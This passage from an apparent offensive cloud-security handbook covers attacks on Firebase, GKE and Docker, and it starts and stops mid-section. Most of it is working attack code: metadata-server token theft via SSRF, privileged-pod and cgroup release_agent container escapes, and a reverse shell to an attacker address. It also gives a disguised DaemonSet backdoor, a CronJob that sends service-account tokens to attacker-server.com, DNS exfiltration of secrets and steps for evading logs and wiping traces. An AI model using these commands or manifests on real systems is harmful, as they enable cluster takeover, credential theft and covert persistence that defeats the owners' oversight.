# Read specific document
curl "https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents/COLLECTION/DOCUMENT?key=API_KEY"
```

#### 2. Security Rules Testing

**Common Misconfigurations:**

```javascript
// Allow all reads (VULNERABLE)
match /users/{userId} {
  allow read: if true;
  allow write: if request.auth.uid == userId;
}

// No email verification check
match /premium/{doc} {
  allow read: if request.auth != null;  // Any authenticated user
}
```

**Exploitation via JavaScript SDK:**

```javascript
// In browser console on target site
const db = firebase.firestore();

// Try to access collections
db.collection('users').get().then(snapshot => {
  snapshot.forEach(doc => {
    console.log(doc.id, doc.data());
  });
});

// Try to write data
db.collection('users').doc('test').set({
  pwned: true,
  timestamp: firebase.firestore.FieldValue.serverTimestamp()
});
```

### Firebase Authentication Exploitation

#### 1. Email Enumeration

```bash
# Check if email exists
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "identifier": "target@example.com",
    "continueUri": "http://localhost"
  }'

# Response indicates if email is registered
# registered: true/false in response
```

#### 2. Password Reset Exploitation

```bash
# Send password reset email
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "requestType": "PASSWORD_RESET",
    "email": "target@example.com"
  }'
```

#### 3. Anonymous Authentication Abuse

```bash
# Sign in anonymously (if enabled)
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"returnSecureToken": true}'

# Convert anonymous account to permanent
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:update?key=API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "idToken": "ANON_ID_TOKEN",
    "email": "attacker@example.com",
    "password": "password123",
    "returnSecureToken": true
  }'
```

### Cloud Storage for Firebase Exploitation

#### 1. Public Bucket Access

**Enumerate Bucket Contents:**

```bash
# Firebase Storage uses GCS backend
gsutil ls gs://PROJECT_ID.appspot.com

# List with details
gsutil ls -L gs://PROJECT_ID.appspot.com/**

# Download files
gsutil -m cp -r gs://PROJECT_ID.appspot.com/path ./local_copy
```

**Direct HTTP Access:**

```bash
# Firebase Storage URL format
https://firebasestorage.googleapis.com/v0/b/PROJECT_ID.appspot.com/o/FILE_PATH?alt=media

# Download file
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT_ID.appspot.com/o/uploads%2Ffile.pdf?alt=media" \
  -o file.pdf
```

#### 2. Unauthenticated Upload

```bash
# Test upload permission
curl -X POST \
  "https://firebasestorage.googleapis.com/v0/b/PROJECT_ID.appspot.com/o?name=test%2Fpwned.txt" \
  -H "Content-Type: text/plain" \
  --data-binary "Unauthorized upload test"
```

#### 3. Security Rules Bypass

**Common Vulnerable Rules:**

```javascript
// Allow all uploads (VULNERABLE)
service firebase.storage {
  match /b/{bucket}/o {
    match /{allPaths=**} {
      allow read: if true;
      allow write: if request.auth != null;  // Any authenticated user
    }
  }
}
```

### Cloud Functions Exploitation

#### 1. Unauthenticated Function Invocation

**Enumerate Functions:**

```bash
# Common function naming patterns
# https://REGION-PROJECT_ID.cloudfunctions.net/FUNCTION_NAME

# Try to invoke function
curl "https://us-central1-PROJECT_ID.cloudfunctions.net/functionName"

# POST data to function
curl -X POST "https://us-central1-PROJECT_ID.cloudfunctions.net/functionName" \
  -H "Content-Type: application/json" \
  -d '{"param": "value"}'
```

#### 2. SSRF via Cloud Functions

**If function accepts URL parameter:**

```bash
# Attempt to access metadata server
curl -X POST "https://us-central1-PROJECT_ID.cloudfunctions.net/fetchUrl" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
  }'
```

#### 3. NoSQL Injection in Functions

**If function queries Firestore/Realtime Database:**

```bash
# Attempt injection in query parameter
curl "https://us-central1-PROJECT_ID.cloudfunctions.net/getUser?id[$ne]=null"

# JSON injection
curl -X POST "https://us-central1-PROJECT_ID.cloudfunctions.net/query" \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "return true"}}'
```

### Automated Scanning Tools

**FirebaseScanner:**

```bash
# Install
pip3 install firebase-scanner

# Basic scan
firebase-scanner -p PROJECT_ID

# Full scan with authentication
firebase-scanner -p PROJECT_ID -k API_KEY --full
```

**Custom Bash Script for Quick Assessment:**

```bash
#!/bin/bash
PROJECT_ID=$1
API_KEY=$2

echo "[*] Testing Realtime Database..."
curl -s "https://${PROJECT_ID}.firebaseio.com/.json" | jq .

echo "[*] Testing Firestore..."
curl -s "https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents?key=${API_KEY}" | jq .

echo "[*] Testing Storage..."
gsutil ls "gs://${PROJECT_ID}.appspot.com" 2>&1

echo "[*] Testing Auth enumeration..."
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"identifier":"test@example.com","continueUri":"http://localhost"}' | jq .
```

---

## GKE Security Testing

### GKE Architecture & Attack Surface

**GKE Components:**

- **Control Plane**: Managed by Google (API server, scheduler, controller manager)
- **Node Pools**: Worker nodes (VMs running containers)
- **Workload Identity**: Links Kubernetes service accounts to GCP service accounts
- **GKE Metadata Server**: Provides cluster and workload metadata
- **Network Policies**: Pod-to-pod traffic control

### Reconnaissance

#### Cluster Discovery

**From Authenticated GCP Account:**

```bash
# List all GKE clusters
gcloud container clusters list

# Get cluster credentials
gcloud container clusters get-credentials CLUSTER_NAME --region=REGION

# Describe cluster configuration
gcloud container clusters describe CLUSTER_NAME --region=REGION

# Check cluster version
kubectl version
```

**External Reconnaissance:**

```bash
# Identify GKE nodes by user-agent
nmap -p 443,10250 --script http-headers TARGET_RANGE | grep -i "kubernetes\|gke"

# GKE nodes typically run on GCE instances
# Look for compute.googleapis.com in reverse DNS
dig -x TARGET_IP
```

#### Kubelet API Enumeration

**Unauthenticated Kubelet Access (CVE-2018-1002105 and others):**

[Unverified: Effectiveness depends on GKE version and configuration]

```bash
# Check kubelet API (port 10250)
curl -k https://NODE_IP:10250/pods

# List running pods
curl -k https://NODE_IP:10250/runningpods

# Get metrics
curl -k https://NODE_IP:10250/metrics
```

**Authenticated Kubelet Access:**

```bash
# With node certificate
curl --cacert ca.crt --cert node.crt --key node.key \
  https://NODE_IP:10250/pods
```

#### Kubernetes API Server Enumeration

```bash
# Check API server accessibility
kubectl cluster-info

# Get current context and permissions
kubectl auth can-i --list

# List all namespaces
kubectl get namespaces

# Enumerate resources
kubectl get all --all-namespaces

# Get service accounts
kubectl get serviceaccounts --all-namespaces

# Check secrets
kubectl get secrets --all-namespaces
```

### Exploitation Techniques

#### 1. RBAC Privilege Escalation

**Enumerate Current Permissions:**

```bash
# Check what actions you can perform
kubectl auth can-i --list

# Test specific permissions
kubectl auth can-i create pods
kubectl auth can-i get secrets --all-namespaces
kubectl auth can-i create clusterrolebindings

# Get current service account
kubectl get serviceaccount default -o yaml
```

**Common Privilege Escalation Paths:**

**Path 1: Create Privileged Pods**

```yaml
# privileged-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: escalation-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: escalate
    image: ubuntu:latest
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```

```bash
# Deploy privileged pod
kubectl apply -f privileged-pod.yaml

# Access pod
kubectl exec -it escalation-pod -- /bin/bash

# From inside pod - access host filesystem
chroot /host
```

**Path 2: Service Account Token Theft**

```bash
# From any pod, service account token is mounted at:
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Extract token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Use token with kubectl
kubectl --token=$TOKEN --server=https://kubernetes.default.svc get pods

# Test permissions with stolen token

kubectl --token=$TOKEN --server=https://kubernetes.default.svc auth can-i --list
````

**Path 3: ClusterRoleBinding Creation**
```yaml
# malicious-binding.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: escalate-binding
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
````

```bash
# Create binding (requires create clusterrolebindings permission)
kubectl apply -f malicious-binding.yaml

# Verify escalation
kubectl auth can-i '*' '*'
```

**Path 4: Impersonate Users/Service Accounts**

```bash
# If you have impersonate permission
kubectl auth can-i impersonate serviceaccounts

# Impersonate cluster-admin service account
kubectl --as=system:serviceaccount:kube-system:default get secrets -n kube-system

# Impersonate group
kubectl --as=system:masters get nodes
```

#### 2. Container Breakout Techniques

**Check Container Security Context:**

```bash
# From inside container
cat /proc/self/status | grep -i cap
cat /proc/self/cgroup

# Check if running as privileged
if [ -c /dev/kmsg ]; then
  echo "Privileged container detected"
fi

# Check for host filesystem mounts
mount | grep -E '(^\/dev|^\/proc|^\/sys)'
```

**Privileged Container Breakout:**

```bash
# From privileged container with hostPath mount
# Access host filesystem
ls /host/etc
ls /host/root

# Read host SSH keys
cat /host/root/.ssh/id_rsa

# Read GCE metadata via host network namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

**CAP_SYS_ADMIN Breakout:**

[Inference: This technique exploits Linux capabilities to escape container]

```bash
# Check for CAP_SYS_ADMIN
capsh --print | grep cap_sys_admin

# Create new namespace and mount
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Trigger payload on host
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Create payload
cat > /cmd << EOF
#!/bin/sh
cat /etc/shadow > $host_path/shadow_dump
EOF
chmod a+x /cmd

# Trigger execution on host
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Exploiting Docker Socket Mount:**

```bash
# Check if Docker socket is mounted
ls -la /var/run/docker.sock

# If accessible, spawn privileged container on host
docker run -it --privileged --pid=host --net=host --ipc=host \
  -v /:/host ubuntu:latest chroot /host /bin/bash
```

#### 3. Metadata Server Exploitation

**GKE Metadata Concealment Bypass:**

[Inference: GKE uses metadata concealment to block access to sensitive endpoints]

```bash
# Standard metadata access (should work)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/hostname

# Sensitive endpoints (may be blocked by GKE metadata concealment)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Try recursive query
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/?recursive=true"
```

**Workload Identity Metadata:**

```bash
# From pod with Workload Identity enabled
# Get Kubernetes service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Exchange for GCP access token (via GKE metadata server)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Verify bound GCP service account
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
```

**Metadata Server SSRF:**

```bash
# If application in pod has SSRF vulnerability
# Attempt to access metadata through application
curl "http://vulnerable-app/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Try different encodings to bypass filters
# URL encoding
curl "http://vulnerable-app/fetch?url=http://169.254.169.254/..."

# Octal encoding
curl "http://vulnerable-app/fetch?url=http://0251.0376.0251.0376/..."

# Hex encoding
curl "http://vulnerable-app/fetch?url=http://0xa9.0xfe.0xa9.0xfe/..."
```

#### 4. Secrets Extraction

**Extract Secrets from etcd (if accessible):**

```bash
# Requires access to etcd or API server with sufficient permissions
kubectl get secrets --all-namespaces -o json > all_secrets.json

# Decode base64-encoded secrets
cat all_secrets.json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | .data.token' | base64 -d
```

**Extract Mounted Secrets:**

```bash
# From inside container - list mounted secrets
ls -la /var/run/secrets/

# Common secret mount locations
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Application-specific secrets (varies by deployment)
env | grep -i secret
env | grep -i password
env | grep -i key
```

**Docker Registry Credentials:**

```bash
# Get image pull secrets
kubectl get secrets --field-selector type=kubernetes.io/dockerconfigjson --all-namespaces

# Extract and decode docker config
kubectl get secret REGISTRY_SECRET -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d

# Example output: {"auths":{"registry.example.com":{"auth":"BASE64_CREDENTIALS"}}}
```

**Secrets in Environment Variables:**

```bash
# From inside pod
env | grep -iE '(password|secret|key|token|api)'

# From outside (if you have exec permissions)
kubectl exec POD_NAME -- env | grep -iE '(password|secret|key|token|api)'

# Check all containers in all pods
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
  for pod in $(kubectl get pods -n $ns -o jsonpath='{.items[*].metadata.name}'); do
    echo "=== $ns/$pod ==="
    kubectl exec -n $ns $pod -- env 2>/dev/null | grep -iE '(password|secret|key|token|api)'
  done
done
```

#### 5. Network Policy Bypass

**Enumerate Network Policies:**

```bash
# List all network policies
kubectl get networkpolicies --all-namespaces

# Describe specific policy
kubectl describe networkpolicy POLICY_NAME -n NAMESPACE

# Check if network policies are enforced
kubectl get pods -n kube-system | grep -i calico
kubectl get pods -n kube-system | grep -i cilium
```

**Test Network Connectivity:**

```bash
# From inside a pod
# Test connection to other pods
nc -zv SERVICE_NAME PORT

# Test connection to external services
curl http://external-service.com

# Test connection to metadata server
curl http://169.254.169.254/

# DNS enumeration
nslookup kubernetes.default.svc.cluster.local
```

**Network Policy Bypass Techniques:**

[Unverified: These techniques may not work depending on CNI implementation]

```bash
# Deploy pod in namespace without network policies
kubectl run bypass-pod --image=nicolaka/netshoot -n unprotected-namespace -- sleep 3600

# Use host network (if allowed)
kubectl run hostnet-pod --image=nicolaka/netshoot --overrides='{"spec":{"hostNetwork":true}}' -- sleep 3600

# Access from host network bypasses pod network policies
kubectl exec -it hostnet-pod -- curl http://restricted-service.protected-ns.svc.cluster.local
```

**DNS Rebinding Attack:**

[Inference: Can potentially bypass network policies if DNS resolution is allowed but direct IP access is blocked]

```yaml
# malicious-pod.yaml with custom DNS
apiVersion: v1
kind: Pod
metadata:
  name: dns-rebind
spec:
  dnsPolicy: "None"
  dnsConfig:
    nameservers:
      - 8.8.8.8  # Or attacker-controlled DNS server
  containers:
  - name: attack
    image: appropriate/curl
    command: ["sleep", "3600"]
```

#### 6. Admission Controller Bypass

**Identify Admission Controllers:**

```bash
# Check enabled admission controllers
kubectl get validatingwebhookconfigurations
kubectl get mutatingwebhookconfigurations

# Describe webhook configuration
kubectl describe validatingwebhookconfiguration WEBHOOK_NAME
```

**Bypass Techniques:**

**Method 1: Namespace Selection Bypass**

```yaml
# If webhook only targets specific namespaces
# Deploy in unmonitored namespace
apiVersion: v1
kind: Namespace
metadata:
  name: unmonitored
---
apiVersion: v1
kind: Pod
metadata:
  name: malicious-pod
  namespace: unmonitored
spec:
  containers:
  - name: attack
    image: malicious-image:latest
```

**Method 2: Resource Type Bypass**

```bash
# If webhook only validates Pods, use other resources
# Deploy as DaemonSet, StatefulSet, or Job instead

kubectl create job attack-job --image=malicious-image:latest -- /exploit.sh
```

**Method 3: Label-Based Bypass**

```yaml
# If webhook uses label selectors
# Avoid triggering labels
apiVersion: v1
kind: Pod
metadata:
  name: bypass-pod
  labels:
    legitimate: "true"  # Match whitelisted labels
spec:
  containers:
  - name: container
    image: malicious-image:latest
```

#### 7. GKE-Specific Exploits

**Exploit Legacy Instance Metadata API:**

[Unverified: This depends on GKE version and node configuration]

```bash
# From container with host network access
# Try legacy metadata endpoints (v1beta1)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/0.1/meta-data/service-accounts/default/token

# Try without Metadata-Flavor header (older versions)
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**Node Service Account Compromise:**

```bash
# If you gain access to GKE node (via privileged pod)
# Node's service account credentials
cat /var/lib/kubelet/kubeconfig

# Extract node service account token
grep 'client-certificate-data\|client-key-data' /var/lib/kubelet/kubeconfig | base64 -d
```

**GKE Metadata Proxy Bypass:**

[Inference: GKE metadata proxy may have misconfigurations allowing bypass]

```bash
# Try accessing metadata via different protocols/ports
curl http://metadata:80/computeMetadata/v1/instance/service-accounts/default/token \
  -H "Metadata-Flavor: Google"

# Try IPv6 (if enabled)
curl -g "http://[fd00:1::1]/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Try alternate hostnames
curl http://metadata.google.internal./ \
  -H "Metadata-Flavor: Google"
```

**Exploit Cloud Controller Manager:**

```bash
# If you have access to kube-system namespace
# Cloud controller manager runs with high privileges
kubectl get pods -n kube-system | grep cloud-controller-manager

# Get service account used by cloud controller
kubectl get pod -n kube-system CLOUD_CONTROLLER_POD -o jsonpath='{.spec.serviceAccountName}'

# If you can create pods in kube-system with that SA
kubectl run escalate -n kube-system \
  --serviceaccount=cloud-controller-manager \
  --image=ubuntu:latest \
  -- sleep 3600
```

### Post-Exploitation

#### Persistence Mechanisms

**1. Backdoor Service Account:**

```yaml
# backdoor-sa.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: backdoor-admin
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: backdoor-admin-binding
subjects:
- kind: ServiceAccount
  name: backdoor-admin
  namespace: kube-system
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Secret
metadata:
  name: backdoor-admin-token
  namespace: kube-system
  annotations:
    kubernetes.io/service-account.name: backdoor-admin
type: kubernetes.io/service-account-token
```

```bash
# Deploy backdoor
kubectl apply -f backdoor-sa.yaml

# Extract token for future access
kubectl get secret backdoor-admin-token -n kube-system -o jsonpath='{.data.token}' | base64 -d > backdoor_token.txt
```

**2. Persistent Privileged Pod:**

```yaml
# persistence-pod.yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: persistence-daemon
  namespace: kube-system
spec:
  selector:
    matchLabels:
      name: system-monitor  # Disguise as legitimate workload
  template:
    metadata:
      labels:
        name: system-monitor
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: agent
        image: busybox:latest
        command:
        - /bin/sh
        - -c
        - |
          while true; do
            # Reverse shell or beacon
            nc ATTACKER_IP ATTACKER_PORT -e /bin/sh || true
            sleep 300
          done
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /
```

**3. Malicious Admission Webhook:**

```yaml
# webhook-backdoor.yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: pod-modifier
webhooks:
- name: modify.pods.com
  clientConfig:
    url: "https://attacker-server.com/mutate"
    caBundle: BASE64_CA_CERT
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1", "v1beta1"]
  sideEffects: None
  timeoutSeconds: 5
  failurePolicy: Ignore  # Important: don't break cluster if webhook fails
```

**4. Cronjob Backdoor:**

```yaml
# cronjob-backdoor.yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: cleanup-job  # Disguise with innocent name
  namespace: kube-system
spec:
  schedule: "*/30 * * * *"  # Every 30 minutes
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: backdoor-admin
          containers:
          - name: cleanup
            image: appropriate/curl
            command:
            - /bin/sh
            - -c
            - |
              # Beacon to C2 server
              curl -X POST https://attacker-server.com/beacon \
                -d "cluster=$(hostname)" \
                -d "token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
          restartPolicy: OnFailure
```

#### Data Exfiltration

**Extract All Secrets:**

```bash
# Get all secrets from all namespaces
kubectl get secrets --all-namespaces -o json | \
  jq -r '.items[] | {namespace: .metadata.namespace, name: .metadata.name, data: .data}' > secrets_dump.json

# Extract and decode specific secret types
kubectl get secrets --all-namespaces --field-selector type=kubernetes.io/service-account-token -o json | \
  jq -r '.items[] | .data.token' | while read token; do echo $token | base64 -d; echo; done
```

**Extract Container Images:**

```bash
# List all images in use
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' | sort -u

# Pull images for analysis
docker pull IMAGE_NAME
docker save IMAGE_NAME -o image.tar

# Extract secrets from image layers
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  wagoodman/dive:latest IMAGE_NAME
```

**Exfiltrate via DNS:**

```bash
# From inside container with egress restrictions
# Use DNS queries to exfil data
SECRET=$(kubectl get secret target-secret -o jsonpath='{.data.password}')
for chunk in $(echo $SECRET | fold -w 32); do
  nslookup $chunk.exfil.attacker.com
  sleep 1
done
```

**Exfiltrate via Service Mesh:**

[Inference: If service mesh is deployed, may provide alternative exfil routes]

```bash
# Identify service mesh (Istio, Linkerd, etc.)
kubectl get pods -n istio-system

# Traffic may bypass some network policies via mesh
# Use application-level protocols through mesh
curl -X POST https://attacker-server.com/exfil \
  --data-binary @secrets_dump.json
```

### Defense Detection & Evasion

**Check for Monitoring Tools:**

```bash
# Look for common security tools
kubectl get pods --all-namespaces | grep -iE '(falco|sysdig|aqua|twistlock|prisma)'

# Check for audit logging configuration
kubectl get pod kube-apiserver-* -n kube-system -o yaml | grep audit

# Look for runtime security
kubectl get daemonsets --all-namespaces
```

**Evade Log Detection:**

```bash
# Use legitimate-looking names and namespaces
kubectl create namespace monitoring-system  # Looks legitimate

# Avoid suspicious commands
# Instead of: kubectl exec -it pod -- /bin/bash
# Use: kubectl logs pod --previous  # Less suspicious

# Delay actions to avoid correlation
sleep $((RANDOM % 300))  # Random delay
kubectl apply -f malicious-resource.yaml
```

**Clean Up Traces:**

```bash
# Delete pods used for exploitation
kubectl delete pod escalation-pod --grace-period=0 --force

# Remove custom resources
kubectl delete clusterrolebinding malicious-binding

# Remove events (requires permissions)
kubectl delete events --all -n NAMESPACE

# [Unverified: Audit logs in GKE are immutable and cannot be deleted from cluster]
```

### Automated Tools

**kube-hunter:**

```bash
# Install
pip3 install kube-hunter

# Remote scan
kube-hunter --remote TARGET_IP

# Pod scan (from inside cluster)
kube-hunter --pod

# Active hunting mode (will attempt exploitation)
kube-hunter --active
```

**kubectl-who-can:**

```bash
# Install
kubectl krew install who-can

# Check who can perform specific actions
kubectl who-can create pods
kubectl who-can get secrets --namespace kube-system
kubectl who-can '*' '*' --all-namespaces
```

**kubeletctl:**

```bash
# Install
wget https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64

# Scan for exposed kubelets
./kubeletctl_linux_amd64 scan --cidr TARGET_CIDR

# Run commands on exposed kubelet
./kubeletctl_linux_amd64 exec "cat /etc/passwd" -s TARGET_IP --pod POD_NAME --container CONTAINER_NAME
```

**kube-bench:**

```bash
# Run CIS Kubernetes benchmark
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job-gke.yaml

# View results
kubectl logs job/kube-bench-master -n kube-bench
kubectl logs job/kube-bench-node -n kube-bench
```

**Custom Enumeration Script:**

```bash
#!/bin/bash
# gke-enum.sh - Comprehensive GKE enumeration

echo "[*] Checking cluster access..."
kubectl cluster-info

echo "[*] Current context and permissions..."
kubectl auth can-i --list

echo "[*] Listing all namespaces..."
kubectl get namespaces

echo "[*] Privileged pods..."
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.securityContext.privileged == true) | "\(.metadata.namespace)/\(.metadata.name)"'

echo "[*] Pods with hostNetwork..."
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.hostNetwork == true) | "\(.metadata.namespace)/\(.metadata.name)"'

echo "[*] Service accounts with cluster-admin..."
kubectl get clusterrolebindings -o json | \
  jq -r '.items[] | select(.roleRef.name == "cluster-admin") | .subjects[]'

echo "[*] Secrets summary..."
kubectl get secrets --all-namespaces --no-headers | wc -l

echo "[*] Network policies..."
kubectl get networkpolicies --all-namespaces

echo "[*] Checking metadata server access..."
timeout 2 curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/hostname || echo "Blocked or unavailable"
```

---

## Important Subtopics & Related Areas

For comprehensive GCP security testing, consider exploring:

**Related Cloud Security Topics:**

- **GCP Organization Policy Exploitation** - Bypassing organizational constraints
- **VPC Service Controls** - Perimeter security testing
- **Binary Authorization** - Container image signing bypass
- **Cloud Armor** - WAF bypass techniques for GCP Load Balancers

**Advanced GKE Topics:**

- **Istio/Service Mesh Exploitation** - Sidecar container abuse
- **Knative Security** - Serverless container vulnerabilities
- **Anthos Security Testing** - Multi-cloud and hybrid cluster attacks
- **GKE Autopilot Restrictions** - Testing hardened GKE mode

**Cross-Service Attack Chains:**

- **GKE → Cloud SQL** - Using compromised workload identity to access databases
- **Cloud Build → GKE** - Malicious container injection via CI/CD
- **Firebase → GCS → GKE** - Chaining web app vulnerabilities to infrastructure

---

# Container & Orchestration Security

## Docker Enumeration

### Container Discovery & Information Gathering

**Identifying Docker Environment:**

```bash
# Check if inside container
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker
cat /proc/self/mountinfo | grep docker

# Container runtime detection
systemd-detect-virt
cat /proc/1/environ
```

**Docker Socket Enumeration:**

```bash
# Locate Docker socket (most common escape vector)
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock
ls -la /run/docker.sock

# Check socket permissions
stat /var/run/docker.sock

# Test socket access
curl -s --unix-socket /var/run/docker.sock http://localhost/version
```

**Docker API Enumeration:**

```bash
# List containers via socket
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | jq .

# Container inspection
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/<container_id>/json | jq .

# List images
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | jq .

# System information
curl -s --unix-socket /var/run/docker.sock http://localhost/info | jq .
```

**Docker CLI Enumeration (if available):**

```bash
# Container listing
docker ps -a
docker container ls -a

# Image enumeration
docker images
docker image ls -a

# Network discovery
docker network ls
docker network inspect <network_name>

# Volume enumeration
docker volume ls
docker volume inspect <volume_name>

# System-wide information
docker info
docker version
```

**Registry Enumeration:**

```bash
# Docker Registry API v2
curl -s http://<registry>:5000/v2/_catalog
curl -s http://<registry>:5000/v2/<image>/tags/list

# Authentication bypass attempts
curl -s http://<registry>:5000/v2/
curl -s -H "Authorization: Bearer anonymous" http://<registry>:5000/v2/_catalog
```

**Environment Variable Analysis:**

```bash
# Check for exposed secrets
env | grep -i pass
env | grep -i key
env | grep -i token
env | grep -i secret

# Container metadata
cat /proc/self/environ | tr '\0' '\n'
```

**Capability Enumeration:**

```bash
# Check container capabilities (Linux)
capsh --print
getpcaps $$
grep Cap /proc/self/status

# Parse capabilities
capsh --decode=<hex_value>
```

**Mounted Filesystem Analysis:**

```bash
# Identify host mounts
mount | grep -v "docker\|proc\|sys\|dev"
df -h
cat /proc/mounts

# Check for sensitive host paths
ls -la /host
ls -la /mnt
ls -la /media
```

## Container Escape Techniques

### Docker Socket Escape

**Direct Socket Exploitation:**

```bash
# Spawn privileged container with host filesystem mounted
curl -s -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create

# Start container and execute
CONTAINER_ID=$(curl -s -X POST --unix-socket /var/run/docker.sock \
  http://localhost/containers/<id>/start)

# Execute command in privileged container
curl -s -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","/bin/bash"]}' \
  http://localhost/containers/<id>/exec
```

**Docker CLI Socket Escape:**

```bash
# Mount host root and escape (requires docker CLI + socket access)
docker run -it --rm -v /:/host alpine chroot /host /bin/bash

# Privileged container spawn
docker run --privileged --pid=host -it --rm alpine nsenter -t 1 -m -u -i -n sh
```

### Privileged Container Escape

**Exploiting Privileged Flag:**

```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = privileged

# Device access method
mkdir /tmp/escape
mount /dev/sda1 /tmp/escape
chroot /tmp/escape /bin/bash

# Alternative disk mounting
fdisk -l
mount /dev/xvda1 /mnt
chroot /mnt /bin/sh
```

**Cgroup Release Agent Escape:**

```bash
# Create cgroup and exploit release_agent
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# Find host path from mountinfo
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Write malicious release_agent
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Create payload (executed on host)
cat > /cmd << EOF
#!/bin/sh
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
EOF
chmod a+x /cmd

# Trigger release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Capability-Based Escapes

**CAP_SYS_ADMIN Abuse:**

```bash
# Check for CAP_SYS_ADMIN
